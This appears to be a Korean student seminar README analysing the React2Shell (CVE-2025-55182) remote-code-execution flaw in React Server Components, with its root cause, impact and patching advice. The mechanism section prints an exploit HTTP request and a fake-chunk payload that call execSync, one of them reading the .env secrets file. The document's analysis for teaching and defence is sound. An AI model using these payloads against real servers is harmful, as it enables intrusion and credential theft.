# React2Shell (CVE-2025-55182)

> 우리FISA 기술세미나 6기 - 3팀 React Server Component(RSC)의 설계 결함을 이용한 원격 코드 실행(RCE) 취약점, React2Shell 분석 및 연구
> 

# Team

| **Member** | **Role** | **GitHub** |
| --- | --- | --- |
| **남인서** | 자료조사, PPT제작, 발표 | [@sene03](https://github.com/sene03) |
| **유승준** | 자료조사, PPT제작, 발표 | [@fluanceifi](https://github.com/fluanceifi) |
| **이수현** | 자료조사, PPT제작 | [@hyun793](https://github.com/hyun7931) |
| **김유정** | 자료조사, PPT제작 | [@yujung23](https://github.com/yujung23) |

---

# 목차 (Contents)

1. [개요: React2Shell이란?](https://www.google.com/search?q=%2301-%EA%B0%9C%EC%9A%94-react2shell%EC%9D%B4%EB%9E%80)
2. [React2Shell 공격 메커니즘](https://www.google.com/search?q=%2302-react2shell-%EA%B3%B5%EA%B2%A9-%EB%A9%94%EC%BB%A4%EB%8B%88%EC%A6%98)
3. [React2Shell이 미친 영향](https://www.google.com/search?q=%2303-react2shell%EC%9D%B4-%EB%AF%B8%EC%B9%9C-%EC%98%81%ED%96%A5)
4. [프론트엔드에서의 보안 책임](https://www.google.com/search?q=%2304-%ED%94%84%EB%A1%A0%ED%8A%B8%EC%97%94%EB%93%9C%EC%97%90%EC%84%9C%EC%9D%98-%EB%B3%B4%EC%95%88-%EC%B1%85%EC%9E%84)

---

# 01. 개요: React2Shell이란?

**React2Shell**(CVE-2025-55182)은 React Server Component(RSC)가 사용하는 **Flight Protocol**의 통신 과정에서 발견된 치명적인 보안 취약점입니다.

- **핵심 문제**: 공격자가 인증 없이 단 한 번의 HTTP 요청으로 서버 내부 명령어를 실행할 수 있습니다.
- **심각도**: CVSS Score **10.0**
- **발생 원인**: 신뢰할 수 없는 데이터의 역직렬화(Deserialization) 과정에서 발생한 Prototype Pollution

## Flight Protocol의 설계 결함

React는 컴포넌트를 처리하기 위해 문자열, 배열 외에도 **Promise, Blob, Map**과 같은 복잡한 타입을 호환하는 **Flight Protocol**을 사용합니다.

| **표현식** | **타입** | **설명** |
| --- | --- | --- |
| `$$` | Escaped $ | $로 시작하는 리터럴 문자열  |
| `$@` | Promise/Chunk | Chunk ID 참조  |

공격자는 이러한 프로토콜 스트림 처리 방식의 취약점을 이용해 악성 스크립트를 주입하고 서버의 제어권을 획득합니다.

## Timeline

- **2025.11.29**: Meta Bug Bounty를 통해 최초 제보
- **2025.11.30**: 보안팀 확인 및 React 팀과 협업 시작
- **2025.12.01**: 패치 코드 개발 및 파트너사(Vercel 등) 검증
- **2025.12.03**: 패치 배포 및 CVE 공개

---

# 02. React2Shell 공격 메커니즘

- 가장 보편적인 공격 방식은 별도의 전제 조건 없이 **React Flight 프로토콜의 참조(Reference) 시스템**을 악용하는 것입니다. 
- 공격은 크게 **폭탄 설치(Payload 전송) → 점화(역직렬화) → 폭발(RCE 실행)**의 3단계로 이루어집니다.

## 1) 폭탄 설치

공격자는 `Next-Action`, `multipart/form-data` 헤더를 포함한 요청을 통해 JSON 데이터를 서버로 전송합니다. 이때 요청 body에 Promise 객체처럼 위장한 가짜 청크(Fake Chunk)를 포함시킵니다.

```jsx
POST / HTTP/1.1
Host: localhost: 3000
[... 기타 헤더 생략 ...]
Next-Action: x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="0"
{"then": "$1: __proto__: then", "status": "resolved_model" , "reason": -1, "value": "{\"then\": \"$B0\"}" , "_response":
f"_prefix": "var res = process mainModule.require('child_process'). execSync('실행할 명령어',
{'timeout': 5000}). toString(). trim(); throw Object.assign(new Error( 'NEXT_REDIRECT'), {digest: ${res} });" {"get":"$1: constructor: constructor"}}}
------WebkitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="1"
"$@0"
------WebKitFormBoundary7MA4YWxkTrZu0gW--
'_formData":
```

## 2) 점화

```jsx
// 공격자가 전송한 가짜 청크 예시
{
	"then" : "$1:__proto__:then"
	"status" : "resolved_model",
	"reason" : -1,
	"value" : "{\"then\":\"$B0\"}",
	"_response" : {
		"_prefix": "execSync('cat .env'); //",
		"_formData":{"get": "$1:constructor:constructor"}
	}
}
```

1. 공격자가 보낸 가짜 청크의 `then`에 `Chunk.prototype.then`이 매핑됩니다.
2. Blob 데이터를 역직렬화하는 과정에서 `_prefix`에 담긴 악성 코드가 `Function`의 인자로 들어갑니다.
3. 생성된 함수가 Promise의 `thenable`로 호출되는 순간, 공격자가 심어둔 임의의 코드가 서버에서 실행됩니다.

## 3) 폭발

```jsx
// POST 요청에 대한 응답 예시
500
0:{"a":"$@1","f":"","b":"sDAZnkg0U4tReIQ4vYjJS"}
1:E{"digest":**"DATABASE_URL='...'"**}
```

### 근본 원인

```jsx
// ReactFlightReplyServer.js - getOutlinedModel() 
for (let i = 1; i < path.length; i++) {
  value = value[path[i]];  // 여기서 hasOwnProperty check가 누락됨!
}
```

- React는 `$1:path:to:value` 형태의 참조를 해석할 때, 콜론(`:`)을 기준으로 문자열을 쪼개어 객체 내부를 탐색합니다.
- 이 과정에서  `$1:__proto__:then` 을 해석하며 chunk의 프로토타입과 해당 객체의 then까지 접근할 수 있게 됩니다(`Chunk.prototype.then` ). 
- 결국 공격자가 보낸 가짜 청크가 진짜 청크의 then을 가지게 되면서, 공격자가 의도한 코드가 실행됩니다.

---

# 03. React2Shell이 미친 영향

이 취약점은 모던 웹 생태계 전반에 큰 파장을 일으켰습니다.

- **서버 컴포넌트 신뢰도 타격**: "프론트엔드 프레임워크가 서버 보안까지 책임져야 하는가?"에 대한 논의 촉발
- **호스팅 플랫폼 비상**: Vercel, Netlify 등 RSC를 지원하는 주요 PaaS 업체들의 긴급 보안 패치 진행

---

# 04. 프론트엔드에서의 보안 책임

React2Shell 사태는 "프론트엔드 개발자도 서버 보안을 이해해야 한다"는 교훈을 남겼습니다.

## 대응 방안

### 1. **즉시 React 관련 패키지 업데이트**
    
     `react-server-dom-webpack` 등 관련 패키지를 즉시 최신 버전(19.0.1+ 등)으로 업데이트
    
### 2. **Framework 패치 여부 확인**
    
    Next.js 등 RSC를 내장한 프레임워크는 단순히 React만 올린다고 해결되지 않으므로 프레임워크 자체의 보안 릴리즈 노트를 확인하고 최신 버전으로의 업그레이드가 필요
    
### 3. **모니터링**
    
    Grafana 같은 모니터링 시스템을 활용하고 이메일, 슬랙 등 경고를 전송할 수 있는 매체와 연결하여 즉각적인 조치를 취할 수 있도록 알람 설정
    

> 기술의 발전으로 프론트엔드의 영역이 확장된 만큼, 보안에 대한 책임의 범위 또한 넓어졌음을 인지해야 합니다.
> 

---

# 참고자료

[React Official Patch](https://github.com/facebook/react/commit/7dc903cd29dac55efb4424853fd0442fef3a8700)

[React2Shell: CVE-2025-55182 취약점 완벽 분석 가이드](https://www.enki.co.kr/media-center/blog/complete-analysis-of-the-react2shell-cve-2025-55182-vulnerability)

[React 서버 컴포넌트 취약점과 시스템 침투 경로 분석](https://bandal.dev/blog/react-2-shell)

[PoC: 취약점 개념 증명 코드](https://github.com/kdh379/react2shell-poc)
